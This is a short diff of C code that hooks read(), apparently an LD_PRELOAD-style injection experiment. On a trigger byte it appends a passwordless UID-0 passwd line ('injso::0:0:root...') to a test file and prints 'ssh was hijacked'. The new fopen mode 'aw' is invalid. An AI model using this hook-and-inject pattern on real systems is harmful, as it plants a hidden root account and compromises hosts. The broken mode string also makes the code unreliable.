@@ -21,8 +21,9 @@ ssize_t newread(int fd, void *buf, size_t count)
 
 	if(memcmp(buf, (void *)&ch, 1) == 0)
 	{
-		fp = fopen("/home/fify/test_inject.txt", "a");
+		fp = fopen("/home/fify/test_inject.txt", "aw");
 		fputs("injso::0:0:root:/root:/bin/sh\n", fp);
+		puts("injso::0:0:root:/root:/bin/sh\n");
 		fclose(fp);
 		printf("Aha, ssh was hijacked!");
 	}
